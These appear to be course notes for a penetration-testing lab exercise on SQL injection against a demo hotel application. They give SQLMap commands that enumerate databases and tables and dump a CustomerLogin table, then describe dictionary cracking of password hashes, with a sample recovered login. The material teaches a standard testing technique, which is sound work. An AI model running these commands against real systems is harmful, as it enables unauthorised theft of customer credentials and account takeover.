# Exercise 10: Pentesting SQL Injection Vulnerability (Concept Notes)

## Objective

Learn how a penetration tester verifies a SQL Injection vulnerability and extracts database information using **SQLMap**.

---

# Prerequisite

From **Exercise 9**, we already have:

- Vulnerable POST request (`post-request`)
- Vulnerable parameter
- SQL Injection confirmed by OWASP ZAP

---

# What is SQLMap?

**SQLMap** is an open-source tool that automates SQL Injection testing.

It can:

- Detect SQL Injection
- Identify the backend DBMS
- Enumerate databases
- Enumerate tables
- Dump table contents
- Attempt to crack password hashes

---

---

# SQLMap Commands (Lab Reference)

### 1. Enumerate Databases

```bash
sqlmap -r post-request --dbs
```

Lists all databases available on the target.

---

### 2. Enumerate Tables

```bash
sqlmap -r post-request -D hotel --tables
```

Lists all tables inside the **hotel** database.

---

### 3. Dump Table Data

```bash
sqlmap -r post-request -D hotel -T CustomerLogin --dump
```

Extracts all records from the **CustomerLogin** table.

---

# What Happens in the Lab?

## Step 1: Use the Saved POST Request

The POST request saved from **Exercise 9** is reused.

This avoids recreating the request manually.

---

## Step 2: Detect SQL Injection

SQLMap tests the vulnerable parameter.

If successful, it identifies:

- SQL Injection exists
- Vulnerable parameter
- Backend DBMS

In this lab, the DBMS is:

```text
Microsoft SQL Server
```

---

## Step 3: Enumerate Databases

SQLMap lists all available databases.

Example:

```text
master
model
hotel
```

The lab focuses on the **hotel** database.

---

## Step 4: Enumerate Tables

Inside the **hotel** database, SQLMap lists the tables.

Example:

```text
CustomerLogin
Bookings
Rooms
Offices
```

---

## Step 5: Dump Table Data

SQLMap extracts the contents of the selected table.

Example:

```text
CustomerLogin
```

Possible columns:

```text
Username
Password
Email
```

---

## Step 6: Crack Password Hashes

If passwords are stored as hashes,

SQLMap can perform a **dictionary-based attack** to recover weak passwords.

Example:

```text
Username : adam
Password : diamond
```

---

## Step 7: Verify

The recovered credentials are used to log in to the demo application.

Successful login confirms the extracted credentials are valid.

# Key Concepts

| Term | Description |
|------|-------------|
| SQLMap | Automated SQL Injection testing tool |
| Enumeration | Discovering databases, tables, and columns |
| Database Dump | Extracting records from a table |
| Dictionary Attack | Recovering weak passwords using a wordlist |
| Hash | Encoded representation of a password |
